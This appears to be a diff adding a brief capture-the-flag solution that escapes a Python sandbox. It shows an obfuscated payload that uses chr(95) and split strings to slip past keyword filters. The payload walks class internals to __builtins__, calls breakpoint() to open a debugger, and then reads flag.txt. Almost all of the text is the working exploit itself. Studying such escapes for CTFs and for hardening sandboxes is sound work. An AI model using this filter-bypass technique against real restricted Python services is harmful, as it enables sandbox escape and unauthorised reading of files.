@@ -1,0 +1,9 @@
+To solve this challenge, you need to enter some Python code to read the flag
+
+getattr(getattr(getattr(getattr(getattr(getattr(getattr((), chr(95) + chr(95) + 'cl'+'ass' + chr(95) + chr(95)), chr(95) + chr(95) + 'cl'+'ass' + chr(95) + chr(95)), chr(95) + chr(95) + 'subcl'+'asses' + chr(95) + chr(95))(getattr(getattr((), chr(95) + chr(95) + 'cl'+'ass' + chr(95) + chr(95)), chr(95) + chr(95) + 'cl'+'ass' + chr(95) + chr(95))), chr(95) + chr(95) + 'get'+'item' + chr(95) + chr(95))(0), 'regi'+'ster'), chr(95) + chr(95) + 'buil'+'tins' + chr(95) + chr(95)), chr(95) + chr(95) + 'get'+'item' + chr(95) + chr(95))('break'+'point')()
+
+which then opens the debugger we can open our flag
+
+print(__import__('builtins').open('flag.txt', 'r').read())                                                                                                                                                                            
+
+The program then prints the flag for you
